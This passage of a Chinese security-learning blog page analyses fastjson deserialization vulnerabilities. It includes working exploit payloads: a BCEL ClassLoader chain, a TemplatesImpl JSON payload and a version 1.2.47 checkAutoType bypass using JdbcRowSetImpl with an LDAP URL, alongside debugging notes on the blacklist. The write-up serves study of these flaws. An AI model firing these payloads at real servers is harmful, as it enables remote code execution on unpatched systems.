class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\mycode\\tmp\\T.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        str = <span class="string">&quot;$$BCEL$$&quot;</span> + str;</span><br><span class="line"><span class="comment">//        classLoader.loadClass(str).newInstance();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;&quot;</span>+str+<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试，成功弹出计算器</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>实用价值不高</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;字节码&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;a.b&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;allowedProtocols&quot;</span><span class="punctuation">:</span> <span class="string">&quot;all&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于该类传入的参数好几个都没有对应的getter和setter方法，所以要利用它的话需要改配置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(s, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>
+
+<h1 id="fastjson高版本绕过"><a href="#fastjson高版本绕过" class="headerlink" title="fastjson高版本绕过"></a>fastjson高版本绕过</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本&lt;&#x3D;1.2.47绕过"></a>版本&lt;&#x3D;1.2.47绕过</h2><p>依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们用上之前的payload来运行的话便会直接报错如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219212541589.png" alt="image-20250219212541589"></p>
+<p>我们在最后一行打个断点调试一下</p>
+<p>发现是在判断key值是否为@type之后做了一个checkAutoType的校验</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219213200453.png" alt="image-20250219213200453"></p>
+<p>我们跟进这个函数看一看，一直往下走，会先从两个缓存（Mapping和deserializers）中进行加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在肯定是没有的，所以我们继续往下走，会直接被黑名单拦截</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224164359679.png" alt="image-20250224164359679"></p>
+<p>黑名单如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../source/imgs/${fiilname}/image-20250224164507635.png" alt="image-20250224164507635" style="zoom: 33%;" /></p>
+<p>从头看该函数，只有通过了黑白名单的校验后才能继续到类加载</p>
+<p>白名单默认是空的，所以显然走不到这里的类加载</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224164815805.png" alt="image-20250224164815805"></p>
+<p>我们再往下看看别的能类加载的代码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224165001015.png" alt="image-20250224165001015"></p>
+<p>这是从缓存中的指定类中获取</p>
+<p>如果缓存中没有的话，会继续从反序列化器中找</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224165130728.png" alt="image-20250224165130728"></p>
+<p>进来看了下，也是从deserializer缓存中加载类</p>
+<p>可以看都是从缓存中来加载类，那么我们就是要看看能不能向缓存类中添加一些我们的恶意类来进行绕过</p>
+<p>查找对mapping进行put操作的部分，来到TypeUtil的loadClass()方法</p>
+<p>于是我们查找该loadClass()的用法</p>
+<p>在TypeUtil本类中的用法当然是派不上用场的</p>
+<p>在checkAutoType()函数中调用，但是受限于if，都走不进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224170951667.png" alt="image-20250224170951667"></p>
+<p>然后就是MiscCodec中的deserialize()中，当clazz为Class.class的时候，会将strVal放入loadClass中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224171124381.png" alt="image-20250224171124381"></p>
+<p>该部分位于deserializer()方法中，说明这东西和反序列化有关</p>
+<p>注意MiscCodec实现了ObjectSerializer和ObjectDeserializer接口，所以这玩意本质上是一个序列化器反序列化器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224172018673.png" alt="image-20250224172018673"></p>
+<p>上文提到过反序列化器是从config中获取到的，这个config我们上文差不多分析过了，走进去底层实际上是在deserializer缓存里找class对应的键值对</p>
+<p>如果我们反序列化的类是Class，那么就会调用MiscCodec的反序列化器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224172637413.png" alt="image-20250224172637413"></p>
+<p>所以在反序列化的时候走到deserializer()中就会调用MiscCodec的loadClass()，然后就会把我们传入的字符串传给loadClass()</p>
+<p>因此一共是分为两步，第一步是先将我们的恶意类加载到缓存中，第二部是从缓存中查找我们的恶意类，从而绕过checkAutoType函数</p>
+<p>payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBypass1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//第一步，反序列化一个Class类，值为恶意类</span></span><br><span class="line">        <span class="comment">//接着用之前的payload</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;AutoCommit\&quot;:false&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么参数名要是val，见下图</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224204130139.png" alt="image-20250224204130139"></p>
+<p>当第二次经过该函数的时候，可以直接从缓存中加载com.sun.rowset.JdbcRowSetImpl，从而绕过检测</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250224205250760.png" alt="image-20250224205250760"></p>
+<p>题外话：</p>
+<p>实际使用fastjson1.2.47走到checkAutoType的时候会发现和1.2.25是不一样的</p>
+<p>原先的denyLists黑名单变成了一个哈希表，主打的就是一个防止安全人员研究这玩意来进行绕过，，</p>
+<p>但是在这个版本还是没防住通过向mappings添加类名来达到类加载的绕过</p>
+<p>已破解开的黑名单哈希如下：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.68"></a>fastjson&lt;&#x3D;1.2.68</h2><p>在1.2.68版本用上以前的payload直接报错，调试一下看看是哪里出了问题</p>
+<p>当走到MiscCodec.deserialize()中触发TypeUtils.loadClass()的地方加入了一个cache参数</p>
+<p>​	</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Sherlock</div><div class="post-copyright__author_desc">言念君子，温其如玉</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/')">java反序列化之fastjson</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=java反序列化之fastjson&amp;url=http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/02/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">java反序列化之jndi</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这里是我<b style="color:#fff">记录学习</b>收获的个人博客，<b style="color:#fff">也希望</b>能和大家一起<b style="color:#fff">进步</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">愿你可以在这里找到对你有<b style="color:#fff">帮助</b>的<b style="color:#fff">文章</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Sherlock</h1><div class="author-info__desc">言念君子，温其如玉</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/cina666" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">基础流程分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-24%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">1.2.24利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">3.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bcel-ClassLoader-%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">3.2.</span> <span class="toc-text">bcel.ClassLoader(不出网)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.3.</span> <span class="toc-text">TemplatesImpl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">fastjson高版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">版本&lt;&#x3D;1.2.47绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">4.2.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.68</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/" title="java反序列化之fastjson">java反序列化之fastjson</a><time datetime="2025-02-13T13:07:39.000Z" title="Created 2025-02-13 21:07:39">2025-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/" title="java反序列化之jndi">java反序列化之jndi</a><time datetime="2025-02-01T02:59:13.000Z" title="Created 2025-02-01 10:59:13">2025-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI-JRMP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="java反序列化之RMI/JRMP反序列化漏洞">java反序列化之RMI/JRMP反序列化漏洞</a><time datetime="2025-01-08T13:44:58.000Z" title="Created 2025-01-08 21:44:58">2025-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%98/" title="java反序列化之RMI专题">java反序列化之RMI专题</a><time datetime="2024-12-26T08:41:11.000Z" title="Created 2024-12-26 16:41:11">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanutils/" title="java反序列化之CommonsBeanutils">java反序列化之CommonsBeanutils</a><time datetime="2024-11-23T11:50:58.000Z" title="Created 2024-11-23 19:50:58">2024-11-23</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2025 By <a class="footer-bar-link" href="/" title="Sherlock" target="_blank">Sherlock</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">53</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 0.88rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 0.88rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 0.88rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 0.88rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" 